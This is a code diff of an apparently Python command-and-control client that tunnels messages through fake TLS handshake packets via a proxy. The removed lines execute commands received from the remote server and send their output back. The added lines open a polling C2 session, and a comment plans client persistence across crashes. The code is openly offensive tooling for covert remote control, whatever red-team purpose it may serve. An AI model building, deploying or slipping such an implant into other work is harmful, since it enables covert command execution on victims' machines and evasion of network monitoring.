-    proxy_socket = connect_func(*connect_args)
-    prox_end_time_ns = int(time.time_ns())
-    if type(proxy_socket) != socket.socket:
+        if not args.direct:
+            proxy = proxy_hostname + ":" + str(proxy_port)
+    # If we get here, args are valid. Now we setup are C2 Session
+    session = Session(server=args.server.lower(), proxy=proxy)
+    #
+    # TODO: Make client sessions persist!
+    # Which means a client will hash some machine specific attribute and write it to file, etc
+    # This so we can persist even if the client crashes or is quit, for example
+    #
+    # Validate that we have an established session
+    if not session.is_connected:
+        print(f"[!] Error - Could not establish a C2 Session with the Server. Details: {session.result_msg}")
         exit(1)
-    is_connected = True
-    reqs_list_str = []
-    reqs_list_byte_stream = []
-    reqs_list_byte_cmds = []
-    if not args.example:
-        reqs_list_str.append(args.message)
-        reqs_list_byte_stream.append(TLSClientHandshake(args.message).to_byte_stream())
-    else:
-        reqs_list_str.append("ping?")
-        reqs_list_byte_stream.append(TLSClientHandshake("ping").to_byte_stream())
-        reqs_list_str.append("DEMO_CMD_1")
-        reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_1").to_byte_stream())
-        reqs_list_str.append("DEMO_CMD_2")
-        reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_2").to_byte_stream())
-        # reqs_list_str.append("DEMO_CMD_3")
-        # reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_3").to_byte_stream())
-    response_parsed_list = []
-    response_bytes_list = []
-    tls_start_time_ns = int(time.time_ns())
-    for k, v in enumerate(reqs_list_byte_stream):
-        print(f" > '{reqs_list_str[k]}' [{len(v)} bytes]")
-        resp_bytes = send_message(proxy_socket, v)
-        response_bytes_list.append(resp_bytes)
-        proxy_socket = _reset_socket(proxy_socket, connect_func, *connect_args)
-        resp_parsed = parse_server_hello(resp_bytes)
-        print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
-        response_parsed_list.append(resp_parsed)
-        if check_for_command(resp_parsed):
-            result_str = "CMD " + run_command(resp_parsed)
-            result_msg = TLSClientHandshake("CMD " + run_command(resp_parsed)).to_byte_stream()
-            reqs_list_byte_cmds.append(result_msg)
-            reqs_list_str.append(result_str)
-            print(f" > '{result_str}' [{len(result_msg)} bytes]")
-            resp_bytes = send_message(proxy_socket, result_msg)
-            resp_parsed = parse_server_hello(resp_bytes)
-            proxy_socket = _reset_socket(proxy_socket, connect_func, *connect_args)
-            print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
-            response_parsed_list.append(resp_parsed)
-    proxy_socket.close()
-    reqs_list_byte_stream = reqs_list_byte_stream + reqs_list_byte_cmds
-    tls_end_time_ns = int(time.time_ns())
-    sent_bytes = sum(map(len, reqs_list_byte_stream))
-    recv_bytes = sum(map(len, response_bytes_list))
-    total_time_ms = int((prox_end_time_ns - prox_start_time_ns) / NS_TO_MS) + int(
-        (tls_end_time_ns - tls_start_time_ns) / NS_TO_MS
-    )
-    print(
-        f"[+] Requests: {len(reqs_list_str)}, Bytes Sent: {sent_bytes}, Bytes Recv: {recv_bytes}, Time: {total_time_ms}ms [{round((total_time_ms/1000),2)}s]"
-    )
-    print("Exiting.")
-    exit(0)
+    # If we get here, we have an established C2 Session :)
+    print(f"[+] CONNECTED to server '{session.server}' in {session.rtt_ms}ms - Client ID: {session.client_id.hex()}")
+    print("Press Ctrl-C to exit...")
+    # Now that our client is up, we periodically update the console with heartbeat status and any commands that may come in form the server
+    try:
+        while True:
+            print(
+                f"    Last Poll: {session.last_poll_time}; RTT: {session.rtt}ms; Last Message: '{session.result_msg}'",
+                end="\r",
+            )
+            sys.stdout.flush()
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print()
+        print("Exiting.")
+        exit(0)
